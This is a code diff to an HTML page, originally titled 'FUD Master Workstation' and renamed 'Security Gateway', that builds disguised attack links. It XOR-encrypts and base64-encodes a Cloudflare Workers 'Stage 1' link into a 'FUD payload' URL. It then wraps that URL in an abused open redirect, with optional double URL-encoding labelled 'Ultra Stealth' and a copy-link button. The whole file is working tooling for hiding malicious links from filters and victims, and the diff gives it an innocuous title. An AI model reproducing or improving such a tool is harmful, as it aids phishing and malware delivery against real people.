@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FUD Master Workstation</title>
+    <title>Security Gateway</title>
     <style id="holdScreen">html { display: none !important; background-color: #f3f4f6; }</style>
 </head>
 <body>
@@ -23,15 +23,21 @@
             <p style="font-size:12px; color:#94a3b8;">1. Worker Link (Stage 1):</p>
             <input type="text" id="workerLink" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://...workers.dev/#key">
             <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE FUD PAYLOAD</button>
-            <div id="stage2Output" style="margin-top: 15px; padding: 10px; background: #020617; border: 1px dashed #38bdf8; color: #fbbf24; font-size: 11px; word-break: break-all; display: none;"></div>
+            <div id="stage2Output" style="margin-top: 10px; padding: 10px; background: #020617; color: #94a3b8; font-size: 10px; word-break: break-all; display: none;"></div>
 
-            <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Merge with Open Redirect:</p>
+            <p style="font-size:12px; color:#94a3b8; margin-top:20px;">2. Redirect Base & Encoding:</p>
             <input type="text" id="redirectBase" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;" placeholder="https://site.com/proxy?url=">
-            <label style="font-size:12px; display: flex; align-items: center; gap: 8px; cursor: pointer;">
-                <input type="checkbox" id="doubleEncode" style="width:auto; margin:0;"> Enable Double-Encoding (Ultra Stealth)
+            
+            <label style="font-size:12px; display: flex; align-items: center; gap: 8px; cursor: pointer; margin: 10px 0;">
+                <input type="checkbox" id="doubleEncode" style="width:auto; margin:0;"> 🛡️ Enable Double-Encoding (Ultra Stealth)
             </label>
-            <button onclick="mergeLinks()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; margin-top:10px;">FINALIZE STEALTH LINK</button>
-            <div id="finalOutput" style="margin-top: 15px; padding: 10px; background: #020617; border: 1px dashed #38bdf8; color: #10b981; font-size: 11px; word-break: break-all; display: none;"></div>
+
+            <button onclick="mergeFinal()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">FINALIZE & MASK LINK</button>
+            
+            <div id="finalContainer" style="display:none; margin-top:15px;">
+                <div id="finalOutput" style="padding: 10px; background: #020617; border: 1px dashed #10b981; color: #10b981; font-size: 11px; word-break: break-all; margin-bottom:10px;"></div>
+                <button onclick="copyToClipboard()" style="background: #64748b; color: white; border: none; padding: 8px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 12px;">COPY FINAL LINK</button>
+            </div>
         </div>
     </div>
 
@@ -68,25 +74,35 @@
             const chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
             for (let i = 0; i < 15; i++) { salt += chars.charAt(Math.floor(Math.random() * chars.length)); }
             let encrypted = "";
-            for (let i = 0; i < input.length; i++) { encrypted += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length)); }
+            for (let i = 0; i < input.length; i++) {
+                encrypted += String.fromCharCode(input.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
+            }
             const finalPayload = btoa(salt + encrypted).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
             const finalUrl = window.location.origin + window.location.pathname + "?p=" + finalPayload;
-            const out = document.getElementById('stage2Output');
-            out.innerText = finalUrl; out.style.display = 'block';
+            document.getElementById('stage2Output').innerText = finalUrl;
+            document.getElementById('stage2Output').style.display = 'block';
         }
 
-        function mergeLinks() {
+        function mergeFinal() {
             const base = document.getElementById('redirectBase').value;
             const github = document.getElementById('stage2Output').innerText;
             const isDouble = document.getElementById('doubleEncode').checked;
             if(!base || !github) return;
 
-            let finalPath = encodeURIComponent(github);
-            if(isDouble) { finalPath = encodeURIComponent(finalPath); }
+            // FULL MASK: Encodes the entire github string including https://
+            let encodedPath = encodeURIComponent(github);
+            if(isDouble) { encodedPath = encodeURIComponent(encodedPath); }
 
-            const out = document.getElementById('finalOutput');
-            out.innerText = base + finalPath;
-            out.style.display = 'block';
+            const finalLink = base + encodedPath;
+            document.getElementById('finalOutput').innerText = finalLink;
+            document.getElementById('finalContainer').style.display = 'block';
+        }
+
+        function copyToClipboard() {
+            const text = document.getElementById('finalOutput').innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                alert("Copied to clipboard!");
+            });
         }
     </script>
 </body>
